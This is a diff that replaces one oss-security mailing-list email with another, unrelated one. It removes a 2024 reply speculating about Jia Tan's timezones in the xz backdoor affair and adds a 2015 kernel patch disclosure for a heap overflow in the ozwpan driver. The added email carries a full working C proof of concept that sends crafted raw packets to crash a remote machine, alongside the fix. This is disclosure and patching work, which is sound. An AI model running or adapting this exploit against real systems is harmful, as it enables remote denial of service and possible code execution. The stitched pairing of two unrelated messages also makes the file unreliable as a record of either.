@@ -1,4 +1,9 @@
-Received: (qmail 5162 invoked by uid 550); 10 Apr 2024 16:24:42 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6232" "Wednesday" "13" "May" "2015" "20:58:18" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431543500-4847-3-git-send-email-Jason@zx2c4.com>" "225" "[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow" nil nil nil "5" "2015051318:58:18" "[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow" (number mark "        Jason@zx2c4. May 13  225/6232  " thread-indent "\"[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow\"\n") "<1431543500-4847-1-git-send-email-Jason@zx2c4.com>" ("<20150513185322.GA4029@kroah.com>" "<1431543500-4847-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 21904 invoked by uid 550); 13 May 2015 18:59:23 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,70 +11,253 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 18032 invoked from network); 13 May 2015 18:58:53 -0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
+	:subject:date:message-id:in-reply-to:references; s=mail; bh=4s8U
+	Akly6i3zTHpYHRy1sssBI8w=; b=BoI8d0Q+tnEk1plzZu3sqYp2alBIc/ONRm7N
+	UtkXzeWwjFM4KjPY+4bi6BLQiJ0KPm7lmgvN0gOuJUzTFIb1+1IhCDOE0QSrcYCH
+	0/ufyi/XSiyinZl25o+f9zqlAN1xp2XX6bbiZ/alQ2CYIz427+XIbBXJOlU9ZGtg
+	G9P5smDaC6dkjM/gryelZMS/LSRk6VeJoKC5YV6+BEB+HUC6Ywdnjq7zd/S4NVEN
+	cUaAkvMqej13x6wQaOy7UyRqjl/vvnXTr3YyCtNu7kzPDzY1J9HMbTwoz++gqnDA
+	2Omif/FKHTbkzEMTIAIsGuezFOlcYLsXgqJSai7OvRfa6agD1g==
+Message-Id: <1431543500-4847-3-git-send-email-Jason@zx2c4.com>
+X-Mailer: git-send-email 2.3.6
+In-Reply-To: <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
+References: <20150513185322.GA4029@kroah.com>
+ <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
+Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
+Date: Wed, 13 May 2015 20:58:18 +0200
+From: "Jason A. Donenfeld" <Jason@zx2c4.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 28477 invoked from network); 10 Apr 2024 16:11:01 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=joeyh.name; s=mail;
-	t=1712765451; bh=y5Vu34TmHYM/ZaD49LIzh/9T+00heDINPokRdF3JOBw=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-	b=O5ypqeN+6KZP/ZG0hv3mrLIih+OuuUYvMl9jmp7pHiqry/uxO/rzeTyq5yy7uPnMX
-	 sxNr+WTEEkjoQ8ENRjoy5QCu5afw2vB/rsHdxYiuumc+4o+pTxqrKYIDohwecJL35a
-	 uLYLxiZGGR1FXtabQa6N0SkGG4J5RTjwYwFCakTk=
-X-Question: 42
-Date: Wed, 10 Apr 2024 12:10:51 -0400
-From: Joey Hess <id@joeyh.name>
-To: Alejandro Colomar <alx@kernel.org>
-Cc: oss-security@lists.openwall.com, Sam James <sam@gentoo.org>,
-	Jonathan Nieder <jrnieder@gmail.com>,
-	Andres Freund <andres@anarazel.de>,
-	Lasse Collin <lasse.collin@tukaani.org>, xz@tukaani.org,
-	secalert@redhat.com, team@security.debian.org
-Message-ID: <Zha6C3RExPyp8iBd@kitenet.net>
-References: <ZhYEpAFolwefRv7X@debian>
-MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="zUF/evWfume9zCfk"
-Content-Disposition: inline
-In-Reply-To: <ZhYEpAFolwefRv7X@debian>
-Subject: [oss-security] Re: Analysis on who is Jia Tan, and who he could work for, reading
- xz.git
+Subject: [oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow
+To: oss-security <oss-security@lists.openwall.com>,
+	linux-kernel@vger.kernel.org,
+	Shigekatsu Tateno <shigekatsu.tateno@atmel.com>,
+	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
+	devel@driverdev.osuosl.org
 
---zUF/evWfume9zCfk
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+Using signed integers, the subtraction between required_size and offset
+could wind up being negative, resulting in a memcpy into a heap buffer
+with a negative length, resulting in huge amounts of network-supplied
+data being copied into the heap, which could potentially lead to remote
+code execution.. This is remotely triggerable with a magic packet.
+A PoC which obtains DoS follows below. It requires the ozprotocol.h file
+from this module.
 
-Alejandro Colomar wrote:
-> I suspect those +0200 and +0300 correspond to a few times that this guy
-> would have traveled to his intelligence agency for some special work
+=-=-=-=-=-=
 
-That's a theory. But many of the commits with author Jia Tan in those
-time zones have committer Lasse Collin, and show signs of being eg,
-git-amed patch sets which may have also been rebased. In which case
-it would make sense that these have Lasse Collin's usual timezone.
+ #include <arpa/inet.h>
+ #include <linux/if_packet.h>
+ #include <net/if.h>
+ #include <netinet/ether.h>
+ #include <stdio.h>
+ #include <string.h>
+ #include <stdlib.h>
+ #include <endian.h>
+ #include <sys/ioctl.h>
+ #include <sys/socket.h>
 
-I analized that here: https://hachyderm.io/@joeyh/112193146103113070
+ #define u8 uint8_t
+ #define u16 uint16_t
+ #define u32 uint32_t
+ #define __packed __attribute__((__packed__))
+ #include "ozprotocol.h"
 
---=20
-see shy jo
+static int hex2num(char c)
+{
+	if (c >= '0' && c <= '9')
+		return c - '0';
+	if (c >= 'a' && c <= 'f')
+		return c - 'a' + 10;
+	if (c >= 'A' && c <= 'F')
+		return c - 'A' + 10;
+	return -1;
+}
+static int hwaddr_aton(const char *txt, uint8_t *addr)
+{
+	int i;
+	for (i = 0; i < 6; i++) {
+		int a, b;
+		a = hex2num(*txt++);
+		if (a < 0)
+			return -1;
+		b = hex2num(*txt++);
+		if (b < 0)
+			return -1;
+		*addr++ = (a << 4) | b;
+		if (i < 5 && *txt++ != ':')
+			return -1;
+	}
+	return 0;
+}
 
---zUF/evWfume9zCfk
-Content-Type: application/pgp-signature; name="signature.asc"
+int main(int argc, char *argv[])
+{
+	if (argc < 3) {
+		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
+		return 1;
+	}
 
------BEGIN PGP SIGNATURE-----
+	uint8_t dest_mac[6];
+	if (hwaddr_aton(argv[2], dest_mac)) {
+		fprintf(stderr, "Invalid mac address.\n");
+		return 1;
+	}
 
-iQIzBAABCgAdFiEEKKUAw1IH6rcvbA8l2xLbD/BfjzgFAmYWugkACgkQ2xLbD/Bf
-jzghIg//e9mSfotdHV4kQ8mvbkeDNMC6cywT+K/cuBmsMxhWbN5QGby6ZWF2AXn8
-AgR1blOx33s5rFv9i6NdBFzFO3C8lI5qqDtZH8RU4vHuuP8CQ5jHfinZgfUuSdGw
-GglTxhteMkyYzutsLUs5WU7F+0YJbw9/na5VfwZbUFZjLVxQMyPXJNfMmwd+1K6s
-vpCbdzuQp3QBNSnXnmdsF4BIOd2aAFmcMmk2YDbxKbKSlW5zzXvefmcijudqFsX+
-G6CAvUN76pFVy/KEbGDwFGr9XjQVml58iNV9nDxUU/+4U4dESzfKJPj8kGzjq0kr
-KKpWqesck9MIP0gau3X9G46Mh9On3xRQJ6XPJlrs+cu58SUFJqlRtpSLIh48Tyk9
-7zNZvjd1jH0ybaV3ObMshnMJqxJARkL2L5brdKGpHGMcEJ/tp0/XqhcI2omyVa1o
-KfLjLL1kkte2t+nJbmksTqMDS/9UNxToxGIIAx2AE24NnttTT9GZxvexNUatbSmM
-nOdDIOVuEunI6kYRmPm1VosHZWriVKAEaYyZ5wyOHAyQt1yhUzQf8PfhvRg97hjh
-bnBQLH5olLjo5PLfjtcQMWUZf4RVL7N3/0UCG0bM9dsAt1VbvTz0yiI1LGzUPHoa
-dX+v3XLKEXiFNMClpi6H2i1bJ8t216j4xgaeLrB2qBXgYUpoFEA=
-=CfPt
------END PGP SIGNATURE-----
+	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+	if (sockfd < 0) {
+		perror("socket");
+		return 1;
+	}
 
---zUF/evWfume9zCfk--
+	struct ifreq if_idx;
+	int interface_index;
+	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
+	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
+		perror("SIOCGIFINDEX");
+		return 1;
+	}
+	interface_index = if_idx.ifr_ifindex;
+	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
+		perror("SIOCGIFHWADDR");
+		return 1;
+	}
+	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_elt_connect_req oz_elt_connect_req;
+	} __packed connect_packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+		},
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(0)
+		},
+		.oz_elt = {
+			.type = OZ_ELT_CONNECT_REQ,
+			.length = sizeof(struct oz_elt_connect_req)
+		},
+		.oz_elt_connect_req = {
+			.mode = 0,
+			.resv1 = {0},
+			.pd_info = 0,
+			.session_id = 0,
+			.presleep = 35,
+			.ms_isoc_latency = 0,
+			.host_vendor = 0,
+			.keep_alive = 0,
+			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
+			.max_len_div16 = 0,
+			.ms_per_isoc = 0,
+			.up_audio_buf = 0,
+			.ms_per_elt = 0
+		}
+	};
+
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_get_desc_rsp oz_get_desc_rsp;
+	} __packed pwn_packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+		},
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(1)
+		},
+		.oz_elt = {
+			.type = OZ_ELT_APP_DATA,
+			.length = sizeof(struct oz_get_desc_rsp)
+		},
+		.oz_get_desc_rsp = {
+			.app_id = OZ_APPID_USB,
+			.elt_seq_num = 0,
+			.type = OZ_GET_DESC_RSP,
+			.req_id = 0,
+			.offset = htole16(2),
+			.total_size = htole16(1),
+			.rcode = 0,
+			.data = {0}
+		}
+	};
+
+	struct sockaddr_ll socket_address = {
+		.sll_ifindex = interface_index,
+		.sll_halen = ETH_ALEN,
+		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+	};
+
+	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	usleep(300000);
+	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	return 0;
+}
+
+Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
+---
+ drivers/staging/ozwpan/ozhcd.c   | 8 ++++----
+ drivers/staging/ozwpan/ozusbif.h | 4 ++--
+ 2 files changed, 6 insertions(+), 6 deletions(-)
+
+diff --git a/drivers/staging/ozwpan/ozhcd.c b/drivers/staging/ozwpan/ozhcd.c
+index 5ff4716..784b5ec 100644
+--- a/drivers/staging/ozwpan/ozhcd.c
++++ b/drivers/staging/ozwpan/ozhcd.c
+@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)
+ /*
+  * Context: softirq
+  */
+-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
+-			int length, int offset, int total_size)
++void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
++			u8 length, u16 offset, u16 total_size)
+ {
+ 	struct oz_port *port = hport;
+ 	struct urb *urb;
+@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
+ 	if (!urb)
+ 		return;
+ 	if (status == 0) {
+-		int copy_len;
+-		int required_size = urb->transfer_buffer_length;
++		unsigned int copy_len;
++		unsigned int required_size = urb->transfer_buffer_length;
+ 
+ 		if (required_size > total_size)
+ 			required_size = total_size;
+diff --git a/drivers/staging/ozwpan/ozusbif.h b/drivers/staging/ozwpan/ozusbif.h
+index 4249fa3..d2a6085 100644
+--- a/drivers/staging/ozwpan/ozusbif.h
++++ b/drivers/staging/ozwpan/ozusbif.h
+@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);
+ 
+ /* Confirmation functions.
+  */
+-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
+-	const u8 *desc, int length, int offset, int total_size);
++void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
++	const u8 *desc, u8 length, u16 offset, u16 total_size);
+ void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
+ 	const u8 *data, int data_len);
+ 
+-- 
+2.3.6
+
